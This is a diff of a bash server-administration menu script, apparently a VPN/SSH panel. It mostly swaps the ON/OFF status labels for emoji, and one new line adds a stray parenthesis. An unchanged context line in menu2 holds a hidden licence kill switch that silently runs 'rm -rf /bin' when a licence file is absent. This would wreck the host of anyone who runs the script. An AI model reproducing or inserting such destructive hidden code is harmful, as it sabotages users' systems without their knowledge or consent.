@@ -199,11 +199,11 @@ function autoexec () {
 }
 #menu2
 menu2 (){
-[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m(ON) ") || stsf=$(echo -e "\033[1;31m(OFF) ")
-stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON) " || echo -e "\033[1;31m(OFF) ")
-stsbotteste=$(ps x | grep "bot_teste"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON) " || echo -e "\033[1;31m(OFF) ")
-stsbotrev=$(ps x | grep "bot_rev"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON) " || echo -e "\033[1;31m(OFF) ")
-autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m(ON) " || echo -e "\033[1;31m(OFF) ")
+[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m✅ ") || stsf=$(echo -e "\033[1;31m❌ ")
+stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m✅ " || echo -e "\033[1;31m❌ ")
+stsbotteste=$(ps x | grep "bot_teste"|grep -v grep > /dev/null && echo -e "\033[1;32m✅ " || echo -e "\033[1;31m❌ ")
+stsbotrev=$(ps x | grep "bot_rev"|grep -v grep > /dev/null && echo -e "\033[1;32m✅ " || echo -e "\033[1;31m❌ ")
+autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m✅ " || echo -e "\033[1;31m❌ ")
 [[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
 if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
 system=$(cut -d' ' -f1 /etc/issue.net)
@@ -309,10 +309,10 @@ esac
 }
 while true $x != "ok"
 do
-stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON) " || echo -e "\033[1;31m(OFF) ")
-swpp=$(ps x | grep "swap"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON) " || echo -e "\033[1;31m(OFF) ")
-stson=$(ps x | grep "onlineapp"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON) " || echo -e "\033[1;31m(OFF) ")
-stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m(ON) " || echo -e "\033[1;31m(OFF) ")
+stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m✅ " || echo -e "\033[1;31m❌ ")
+swpp=$(ps x | grep "swap"|grep -v grep > /dev/null && echo -e "\033[1;32m✅ " || echo -e "\033[1;31m❌) ")
+stson=$(ps x | grep "onlineapp"|grep -v grep > /dev/null && echo -e "\033[1;32m✅ " || echo -e "\033[1;31m❌ ")
+stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m✅ " || echo -e "\033[1;31m❌ ")
 if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
 system=$(cut -d' ' -f1 /etc/issue.net)
 system+=$(echo ' ')
